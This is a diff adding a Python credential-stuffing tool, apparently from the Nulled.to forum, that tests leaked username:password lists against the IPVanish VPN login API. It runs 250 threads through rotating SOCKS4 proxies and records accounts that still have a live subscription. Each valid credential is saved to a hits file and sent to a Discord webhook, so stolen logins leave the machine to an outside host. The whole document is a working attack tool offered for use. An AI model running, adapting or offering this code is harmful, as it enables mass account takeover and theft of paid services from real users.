@@ -1,0 +1,186 @@
+from requests import post, get
+from discord_webhook import DiscordWebhook, DiscordEmbed
+from requests.exceptions import RequestException
+from os import system, getcwd
+from tkinter import Tk, filedialog
+from time import time, sleep
+from printy import printy
+from threading import Thread
+from datetime import datetime
+from random import randint
+from re import findall
+from hashlib import md5
+import ctypes
+
+def __set_title():
+    cpm = 0
+    while True:
+        lenBefore = len(combolist)
+        sleep(2)
+        donein2secs = lenBefore - len(combolist)
+        cpm = donein2secs * 30
+        ctypes.windll.kernel32.SetConsoleTitleW(f"IPVanish.com | Progress: ({str(clen - len(combolist))}/{str(clen)}) | Proxies: ({str(plen - len(proxies))}/{str(plen)}) | CPM: {str(cpm)} | Hits: {str(len(hits))} | Made by Nikko for Nulled.to")
+
+
+def out(combo, mode, capture=None):
+    if mode == 1:
+        c = 'r'
+        m = '\\[Invalid\\]'
+        n = 1
+    elif mode == 2:
+        c = 'y'
+        m = '\\[Retry\\]  '
+        n = randint(0, 30)
+    elif mode == 3:
+        c = 'n'
+        m = '\\[Success\\]'
+        n = 1
+        embed = DiscordEmbed(description='HIT', color=16515843)
+        embed.set_footer(text='Cracked by Forlax')
+        embed.add_embed_field(name='Combo', value=f"{combo[0]}:{combo[1]}")
+        embed.add_embed_field(name='Capture', value=('Subscription Until: ' + capture))
+        webhook.add_embed(embed)
+        response = webhook.execute()
+        with open(filename, 'a') as (a):
+            a.write(f"{combo[0]}:{combo[1]} | Subscription Until: {capture}\n")
+        hits.append(1)
+    if n == 1:
+        printy(('{} | {}:{} | {} '.format)(m, *combo), c)
+
+
+def login(combo):
+    try:
+        loginReq = post(url=loginUrl,
+          headers=headers,
+          data=('{"api_key":"15cb936e6d19cd7db1d6f94b96017541","client":"Android-3.4.3.8.78940b78940","os":"22","password":"' + combo[1] + '","username":"' + combo[0] + '","uuid":"699f6e7b-e36e-4946-b588-722104dc8ded"}'),
+          timeout=20,
+          proxies={'https': 'socks4://' + combo[2]})
+    except RequestException:
+        out(combo, 2)
+        del combo[2]
+        return combo
+    else:
+        response = loginReq.text
+        if failKey in response:
+            out(combo, 1)
+            return [
+             combo[2]]
+        if successKey in response:
+            ts = int(findall('(?<="sub_end_epoch":)(.*?)(?=,")', response)[0])
+            date = datetime.utcfromtimestamp(ts).strftime('%d-%m-%Y')
+            datesplit = date.split('-')
+            if int(datesplit[2]) > 2019:
+                if int(datesplit[1]) > 4:
+                    out(combo, 3, date)
+            return [
+             combo[2]]
+        if retryKey in response:
+            out(combo, 2)
+            del combo[2]
+            return combo
+        debug = 'ipvanish debug ' + datetime.now().strftime('%Hh%Mm %d-%m-%Y') + '.txt'
+        with open(debug, 'w') as (w):
+            w.write(f"Combo: {combo[0]}:{combo[1]} | Proxy: {combo[2]}\nUnexpected Response:\n" + response)
+
+
+def __while_login():
+    c = [
+     proxies.pop()]
+    while combolist or len(c) != 1:
+        if proxies:
+            pass
+        else:
+            for p in savedProxies:
+                proxies.append(p)
+
+        if len(c) == 1:
+            combo = combolist.pop().split(':')
+            combo.extend(c)
+        else:
+            c.append(proxies.pop())
+            combo = c
+        c = login(combo)
+
+
+def __start_threads():
+    list_process = []
+    process = Thread(target=__set_title, args=())
+    process.start()
+    list_process.append(process)
+    for _ in range(0, 250):
+        process = Thread(target=__while_login, args=())
+        process.start()
+        list_process.append(process)
+
+    for process in list_process:
+        process.join()
+
+
+def lists():
+    root = Tk()
+    root.withdraw()
+    print('Select your Combolist')
+    combopath = filedialog.askopenfilename(initialdir=(getcwd()),
+      title='Select combolist',
+      filetypes=(('Combolist', '*.txt'), ('All files', '*.*')))
+    with open(combopath, 'r', encoding='utf8', errors='ignore') as (r):
+        ucombolist = r.read().splitlines()
+        combolist = []
+        for c in ucombolist:
+            try:
+                if len(c.split(':')[1]) > 6:
+                    combolist.append(c)
+            except IndexError:
+                continue
+
+        combolist = list(set(combolist))
+        diff = len(ucombolist) - len(combolist)
+        del ucombolist
+        print('Combolist loaded - Removed ' + str(diff) + ' poor lines\n')
+    print('Select your Proxies')
+    proxypath = filedialog.askopenfilename(initialdir=(getcwd()),
+      title='Select proxies',
+      filetypes=(('Proxies', '*.txt'), ('All files', '*.*')))
+    with open(proxypath, 'r', encoding='utf8', errors='ignore') as (r):
+        uproxies = r.read().splitlines()
+        proxies = [p for p in uproxies if len(p) > 0 if ':' in p]
+        diff = len(uproxies) - len(proxies)
+        print('Proxies loaded - Removed ' + str(diff) + ' poor lines')
+    return (
+     combolist, proxies)
+
+
+def welcomeText():
+    printy('\n                               .-"^`\\                                        /`^"-.\n                             .\'   ___\\                                      /___   `.\n                            /    /.---.                                    .---.\\    \\\n                           |    //     \'-.  ___________________________ .-\'     \\\\    |\n                           |   ;|         \\/--------------------------//         |;   |\n                           \\   ||       |\\_)     IPVanish Checker     (_/|       ||   /\n                            \\  | \\  . \\ ;  |       Made By Nikko      || ; / .  / |  /\n                             \'\\_\\ \\\\ \\ \\ \\ |                          ||/ / / // /_/\'\n                                   \\\\ \\ \\ \\|      Exclusively for     |/ / / //\n                                    `\'-\\_\\_\\         Nulled.to        /_/_/-\'`\n                                           \'--------------------------\'\n    ', 'y')
+
+
+if __name__ == '__main__':
+    clear = lambda : system('cls||echo -e \\\\033c')
+    welcomeText()
+    printy('\n*** Cracked by Forlax! Starting the program ***', 'n')
+    sleep(2)
+    clear()
+    webhookUrl = input('WebHook Url\n> ')
+    sleep(1)
+    clear()
+    webhook = DiscordWebhook(url=webhookUrl, username='IPVanish Checker', avatar_url='https://static.nulled.to/uploads/profile/photo-1930652.png')
+    loginUrl = 'https://api.ipvanish.com/api/v3/login'
+    headers = {'X-Client':'ipvanish', 
+     'X-Client-Version':'1.2.', 
+     'X-Platform':'Android', 
+     'X-Platform-Version':'22', 
+     'Content-Type':'application/json; charset=utf-8', 
+     'User-Agent':'okhttp/3.12.1'}
+    failKey = '1100'
+    successKey = 'access_token'
+    retryKey = '1099'
+    combolist, proxies = lists()
+    savedProxies = proxies.copy()
+    clen = len(combolist)
+    plen = len(proxies)
+    hits = []
+    sleep(2)
+    clear()
+    filename = 'ipvanish hits ' + datetime.now().strftime('%Hh%Mm %d-%m-%Y') + '.txt'
+    debug = 'ipvanish debug ' + datetime.now().strftime('%Hh%Mm %d-%m-%Y') + '.txt'
+    __start_threads()
